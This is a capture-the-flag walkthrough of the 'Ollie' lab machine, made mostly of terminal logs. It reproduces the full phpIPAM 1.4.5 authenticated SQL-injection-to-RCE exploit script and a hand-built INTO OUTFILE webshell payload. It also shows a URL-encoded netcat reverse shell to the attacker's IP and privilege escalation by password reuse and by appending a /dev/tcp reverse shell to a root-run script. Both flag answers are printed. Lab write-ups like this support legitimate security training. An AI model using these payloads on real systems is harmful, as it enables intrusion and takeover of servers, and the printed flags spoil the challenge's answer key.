---
Meet the world's most powerful hacker dog!
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/c9a9e59d232db4474759bbf89a1d821a.jpeg)

###  ROOF ROOF

 Start Machine

Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e3595f110c4674ba9f80e7a/room-content/9e73c99868e94dfa12783f95a1af0178.jpg)

**_Rest in Peace 1/5/2023_**


**_Please allow up to 3 minutes for the machine to boot._**

Answer the questions below

```
┌──(witty㉿kali)-[~/bug_hunter/s3brute]
└─$ rustscan -a 10.10.133.68 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.133.68:22
Open 10.10.133.68:80
Open 10.10.133.68:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 13:00 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:00
Completed Parallel DNS resolution of 1 host. at 13:00, 13.01s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 13:00
Scanning 10.10.133.68 [3 ports]
Discovered open port 22/tcp on 10.10.133.68
Discovered open port 80/tcp on 10.10.133.68
Discovered open port 1337/tcp on 10.10.133.68
Completed Connect Scan at 13:00, 0.20s elapsed (3 total ports)
Initiating Service scan at 13:00
Scanning 3 services on 10.10.133.68
Completed Service scan at 13:03, 161.94s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.133.68.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:03
NSE Timing: About 98.81% done; ETC: 13:04 (0:00:00 remaining)
NSE Timing: About 99.29% done; ETC: 13:04 (0:00:00 remaining)
NSE Timing: About 99.76% done; ETC: 13:05 (0:00:00 remaining)
Completed NSE at 13:05, 100.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 1.89s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
Nmap scan report for 10.10.133.68
Host is up, received user-set (0.19s latency).
Scanned at 2023-02-24 13:00:54 EST for 265s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b71ba8f88c8a4a5355c02e8901f25669 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP5+l/iCTR0Sqa4q0dIntXiVyRE5hsnPV5UfG4D+sQKeM4XoG7mzycPzJxn9WkONCwgmLWyFD1wHOnexqtxEOoyCrHhP2xGz+5sOsJ7RbpA0KL/CAUKs2aCtonKUwg5FEhOjUy945M0e/DmstbOYx8od6603eb4TytHfxQHPPiWBBRCmg6e+5UjcHLSOqDEzXkDOmmLieiE008fEVrNAmF2J+I4XPJI7Usaf3IzpnaFm3Ca9YvNAr4t8gpDST2uNuRWA9NCMspBFEj/5YQfjOnYx2cSSZHUP3lK8tiwc/RWSk7OBTXYOBncyV4lw8OiyJ1fOhr/2gXTXE/tWQvu1zKWYYafMKRdsH6nuE5nZ0CK3pLHe/nUgIsVPl7sJ3QlqJF7Wd5OmY3e4Py7movqFm/HmW+zjwsXGHnzENC47N+RxV0XTYCxbKzTAZDo5gLMxmsbXWnQmU5GMk0e9sh7HHybmWWkKKYJiOp+3yM9vTPXPiNXBeJmvWa01hoAAi+3OU=
|   256 4e2743b6f454f918d038dacd769b8548 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFL/P1VyyCYVY2aUZcXTLmHkiXGo4/KdJptRP7Wioy78Sb/W/bKDAq3Yl6a6RQW7KlGSbZ84who5gWwVMTSTt2U=
|   256 1482cabb04e501839cd654e9d1fac482 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHmTKDYCCJVK6wx0kZdjLd1YZeLryW/qXfKAfzqN/UHv
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1337/tcp open  waste?  syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.93%I=7%D=2/24%Time=63F8FB5D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 282.87 seconds

┌──(witty㉿kali)-[~/bug_hunter/s3brute]
└─$ nc 10.10.133.68 1337                    
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? Ollie
What's up, Ollie! It's been a while. What are you here for? exploit
Ya' know what? Ollie. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!

┌──(witty㉿kali)-[~/bug_hunter/s3brute]
└─$ ssh admin@10.10.133.68 
^C

Deactivate WARP

http://10.10.133.68/index.php?page=login

view-source:http://10.10.133.68/index.php?page=login

<a href="http://phpipam.net">phpIPAM IP address management [v1.4.5]</a>

https://www.exploit-db.com/exploits/50963
https://fluidattacks.com/advisories/mercury/

cat 50963.py  
# Exploit Title: phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-04-10
# Exploit Author: Guilherme '@behiNdyk1' Alves
# Vendor Homepage: https://phpipam.net/
# Software Link: https://github.com/phpipam/phpipam/releases/tag/v1.4.5
# Version: 1.4.5
# Tested on: Linux Ubuntu 20.04.3 LTS

#!/usr/bin/env python3

import requests
import argparse
from sys import exit, argv
from termcolor import colored

banner = """
█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄\n"""
print(banner)

parser = argparse.ArgumentParser(usage="./exploit.py -url http://domain.tld/ipam_base_url -usr username -pwd password -cmd 'command_to_execute' --path /system/writable/path/to/save/shell", description="phpIPAM 1.4.5 - (Authenticated) SQL Injection to RCE")

parser.add_argument("-url", type=str, help="URL to vulnerable IPAM", required=True)
parser.add_argument("-usr", type=str, help="Username to log in as", required=True)
parser.add_argument("-pwd", type=str, help="User's password", required=True)
parser.add_argument("-cmd", type=str, help="Command to execute", default="id")
parser.add_argument("--path", type=str, help="Path to writable system folder and accessible via webserver (default: /var/www/html)", default="/var/www/html")
parser.add_argument("--shell", type=str, help="Spawn a shell (non-interactive)", nargs="?")
args = parser.parse_args()

url = args.url
username = args.usr
password = args.pwd
command = args.cmd
path = args.path

# Validating url
if url.endswith("/"):
	url = url[:-1]
if not url.startswith("http://") and not url.startswith("https://"):
	print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
	exit()

def login(url, username, password):
	"""Takes an username and a password and tries to execute a login (IPAM)"""
	data = {
	"ipamusername": username,
	"ipampassword": password
	}
	print(colored(f"[...] Trying to log in as {username}", "blue"))
	r = requests.post(f"{url}/app/login/login_check.php", data=data)
	if "Invalid username or password" in r.text:
		print(colored(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}", "red"))
		exit()
	else:
		print(colored("[+] Login successful!", "green"))
		return str(r.cookies['phpipam'])

auth_cookie = login(url, username, password)

def exploit(url, auth_cookie, path, command):
	print(colored("[...] Exploiting", "blue"))
	vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
	data = {
	"subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
	"bgp_id": "1"
	}
	cookies = {
	"phpipam": auth_cookie
	}
	requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
	test = requests.get(f"{url}/evil.php")
	if test.status_code != 200:
		return print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
	if "--shell" in argv:
		while True:
			command = input("Shell> ")
			r = requests.get(f"{url}/evil.php?cmd={command}")
			print(r.text)
	else:
		print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
		r = requests.get(f"{url}/evil.php?cmd={command}")
		print(f"\n\n[+] Output:\n{r.text}")

exploit(url, auth_cookie, path, command)    

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 50963.py -url http://10.10.133.68 -usr admin -pwd OllieUnixMontgomery! -cmd 'id' 

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://10.10.133.68/evil.php. Parameter: cmd


[+] Output:
1	 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	3	4



phpIPAM es una herramienta de administración de direcciones IP (IPAM) de código abierto basada en la web. Permite a los administradores de red gestionar sus direcciones IP y subredes de manera eficiente, lo que resulta muy útil en redes grandes y complejas.

phpIPAM es una herramienta bastante completa que incluye muchas funciones útiles, como la gestión de direcciones IP, subredes y VLAN, el descubrimiento automático de dispositivos de red, la generación automática de informes, la integración con herramientas de terceros, la autenticación basada en roles y permisos, entre otros.

Aunque puede haber cierta curva de aprendizaje para usuarios nuevos en la herramienta, phpIPAM se considera relativamente simple en comparación con otras soluciones de IPAM más complejas y costosas. Además, su naturaleza de código abierto lo hace altamente personalizable y adaptable a las necesidades de cada organización.

## Proof of Concept

Steps to reproduce

1.  Go to settings and enable the routing module.
2.  Go to show routing.
3.  Click on "Add peer" and create a new "BGP peer".
4.  Click on the newly created "BGP peer".
5.  Click on "Actions" and go to "Subnet Mapping".
6.  Scroll down to "Map new subnet".
7.  Insert an SQL Injection sentence inside the search parameter, for example: `" union select @@version,2,user(),4 -- -`.


" union select @@version,2,user(),4 -- -

	8.0.28-0ubuntu0.20.04.3/phpipam_ollie@localhost (4)	

" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -

1/3 (debian-sys-maint:Y,mysql.infoschema:N,mysql.session:N,mysql.sys:N,ollie_mysql:Y,phpipam_ollie:Y,root:Y)

The query uses the "union all" command to combine the result sets from two separate queries into one. The first query returns the values 1, 2, and 3, which are not particularly relevant to the attack. The second query uses the "group_concat" function to concatenate the "user" and "file_priv" fields from the "mysql.user" table, separated by a colon (represented by the hex value "0x3a"). The "-- -" characters at the end of the query are used to comment out the remaining portion of the original query, preventing any errors.

In summary, this attack query aims to extract information about the users and file privileges in the MySQL database, by exploiting a vulnerability that allows an attacker to inject malicious SQL code into an application's input fields. It is important to note that SQL injection attacks can be very dangerous and can result in unauthorized access to sensitive data, modification or deletion of data, or even complete system compromise.

`phpipam_ollie` is able to write a file!

"<?php system($_GET["cmd"]); ?>"
to hex

" Union Select 1,0x223c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e22,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -

┌──(witty㉿kali)-[~/bug_hunter/svn-extractor]
└─$ curl http://10.10.49.94/shell.php\?cmd\=whoami   
1	"www-data
"	3	4

revshell

https://www.revshells.com/

┌──(witty㉿kali)-[~/bug_hunter/svn-extractor]
└─$ curl http://10.10.49.94/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.19.103%204443%20%3E%2Ftmp%2Ff

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.49.94] 40914
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@hackerdog:/var/www/html$ ls
ls
INSTALL.txt  app		db		  index.php  robots.txt
README.md    config.docker.php	functions	  install    shell.php
UPDATE	     config.php		imgs		  js	     upgrade
api	     css		immaolllieeboyyy  misc

www-data@hackerdog:/var/www/html$ cat robots.txt
cat robots.txt
User-agent: *
Disallow: /
Disallow: /immaolllieeboyyy
www-data@hackerdog:/var/www/html$ cd /home
cd /home
www-data@hackerdog:/home$ ls
ls
ollie
www-data@hackerdog:/home$ cd ollie
cd ollie
www-data@hackerdog:/home/ollie$ ls
ls
user.txt
www-data@hackerdog:/home/ollie$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

Password Reuse attack!

www-data@hackerdog:/home/ollie$ su ollie
su ollie
Password: OllieUnixMontgomery!

ollie@hackerdog:~$ cat user.txt
cat user.txt
THM{Ollie_boi_is_daH_Cut3st}

ollie@hackerdog:~$ sudo -l
sudo -l
[sudo] password for ollie: OllieUnixMontgomery!

Sorry, user ollie may not run sudo on hackerdog.

ollie@hackerdog:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2128/bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2128/bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2128/bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2128/bin/umount
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2128/usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2128/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/2128/usr/bin/newgrp
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/2128/usr/bin/passwd
-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2128/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2284/bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2284/bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2284/bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2284/bin/umount
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2284/usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2284/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2284/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/2284/usr/bin/newgrp
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/2284/usr/bin/passwd
-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2284/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            427K Aug 11  2021 /snap/core18/2284/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /snap/core20/1328/usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /snap/core20/1328/usr/bin/chsh
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /snap/core20/1328/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Jul 21  2020 /snap/core20/1328/usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /snap/core20/1328/usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /snap/core20/1328/usr/bin/passwd
-rwsr-xr-x 1 root   root             67K Jul 21  2020 /snap/core20/1328/usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /snap/core20/1328/usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Jul 21  2020 /snap/core20/1328/usr/bin/umount
-rwsr-xr-- 1 root   systemd-resolve  51K Jun 11  2020 /snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            463K Dec  2  2021 /snap/core20/1328/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Jul 14  2021 /snap/snapd/12704/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root            121K Jan  7  2022 /snap/snapd/14549/usr/lib/snapd/snap-confine
-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root   root             39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root   root             31K Jan 12  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root   root             67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Feb  7  2022 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus       51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            463K Dec  2  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             23K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root            128K Sep  9  2021 /usr/lib/snapd/snap-confine

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.10.49.94 - - [24/Feb/2023 15:48:53] "GET /pspy64 HTTP/1.1" 200 -

ollie@hackerdog:/$ cd /tmp
cd /tmp
ollie@hackerdog:/tmp$ wget http://10.8.19.103:7070/pspy64
wget http://10.8.19.103:7070/pspy64
--2023-02-24 20:51:39--  http://10.8.19.103:7070/pspy64
Connecting to 10.8.19.103:7070... connected.
HTTP request sent, awaiting response... 200 OK

ollie@hackerdog:/tmp$ chmod +x pspy64
chmod +x pspy64
ollie@hackerdog:/tmp$ ./pspy64

ollie@hackerdog:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/02/24 20:55:09 CMD: UID=0     PID=2333   | /lib/systemd/systemd-udevd 
2023/02/24 20:55:09 CMD: UID=0     PID=2332   | /bin/bash /usr/bin/feedme 
www-data@hackerdog:/tmp$ ls -la /usr/bin/feedme
ls -la /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
www-data@hackerdog:/tmp$ cat /usr/bin/feedme
cat /usr/bin/feedme
#!/bin/bash

# This is weird?
ollie@hackerdog:/tmp$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/1337 0>&1" >> /usr/bin/feedme
< /dev/tcp/10.8.19.103/1337 0>&1" >> /usr/bin/feedme

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.49.94] 51564
bash: cannot set terminal process group (2462): Inappropriate ioctl for device
bash: no job control in this shell
root@hackerdog:/# cd /root
cd /root
root@hackerdog:~# ls
ls
root.txt
snap
root@hackerdog:~# cat root.txt
cat root.txt
THM{Ollie_Luvs_Chicken_Fries}

root@hackerdog:/var/www/html# docker ps
docker ps
CONTAINER ID   IMAGE      COMMAND                  CREATED         STATUS          PORTS                                       NAMES
a1a0f8014a1c   olliebot   "python3 -u olliebot…"   12 months ago   Up 39 minutes   0.0.0.0:1337->1337/tcp, :::1337->1337/tcp   olliebot

root@hackerdog:/var/www/html# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@hackerdog:/var/www/html# docker exec -it a1a0f8014a1c sh
docker exec -it a1a0f8014a1c sh
/ # 55R5R
5R5R
sh: 5R5R: not found
/ # 55R5Rwhoami
5R5Rwhoami
/ # lls
ls
app          home         olliebot.py  run          tmp
bin          lib          opt          sbin         usr
dev          media        proc         srv          var
etc          mnt          root         sys
/ # ccat olliebot.py
cat olliebot.py
import sys
import threading
import socket
from time import sleep

#make this run on startup  WIP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1337))
s.listen()

def catch(c, a):
    c.send(b"Hey stranger, I\'m Ollie, protector of panels, lover of deer antlers.\n\nWhat is your name? ")
    user = c.recv(1024).decode("utf-8").strip("\n")
